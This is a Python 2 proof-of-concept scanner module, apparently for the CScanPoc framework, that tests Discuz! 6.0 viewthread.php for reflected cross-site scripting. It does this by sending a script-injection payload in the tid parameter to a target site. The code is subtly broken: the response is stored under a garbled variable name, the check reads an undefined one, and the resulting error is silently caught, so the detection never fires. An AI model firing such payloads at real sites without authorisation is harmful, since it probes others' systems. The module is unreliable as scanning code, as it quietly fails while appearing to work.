# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0112' # 平台漏洞编号，留空
    name = 'Discuz! 6.0 /viewthread.php 跨站脚本' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-10-29'  # 漏洞公布时间
    desc = '''
    Cross site scripting has benn found on viewthread.php file.
    ''' # 漏洞描述
    ref = 'https://www.yascanner.com/#!/x/11200' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz'  # 漏洞应用名称
    product_version = '6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8cd371e5-8d4c-497d-ac11-9885f83b968c' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            verify_url = self.target + '/viewthread.php?tid="/><script>alert(233)</script>'
            req = urllib2.Request(verify_url)
            erify_urcontent = urllib2.urlopen(req).read()
            if '"/><script>alert(233)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()